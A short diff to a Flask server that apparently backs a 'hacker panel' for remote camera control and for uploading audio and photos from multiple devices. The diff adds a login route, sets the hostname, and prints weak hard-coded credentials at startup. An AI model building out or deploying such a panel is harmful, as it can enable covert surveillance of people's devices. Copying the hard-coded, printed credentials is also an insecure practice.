@@ -26,12 +26,17 @@ def home():
                          current_time=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 
                          server_ip=get_server_ip())
 
+@app.route('/login')
+def login():
+    return render_template('login.html')
+
 def get_server_ip():
     try:
-        # Render pe hostname return karo
-        return "your-app-name.onrender.com"  # TODO: Replace with your actual app name
+        # Get server IP or hostname
+        # For Render deployment
+        return "sukh-hacker-panel.onrender.com"  # TODO: Replace with your actual app name on Render
     except:
-        return "localhost"
+        return "localhost:5000"
 
 # Photo upload endpoint
 @app.route('/upload_photo', methods=['POST'])
@@ -467,8 +472,12 @@ if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     print(f'🚀 Starting Multi-Device Voice Recorder & Camera Control Server...')
     print(f'📡 Web Panel: http://0.0.0.0:{port}')
+    print('🔐 Login Credentials:')
+    print('   - Username: Sukh')
+    print('   - Password: Sukh')
     print('📍 Available Endpoints:')
     print('   - GET  /')
+    print('   - GET  /login')
     print('   - POST /camera (camera control)')
     print('   - POST /data (audio upload)')
     print('   - POST /upload_photo (photo upload)')
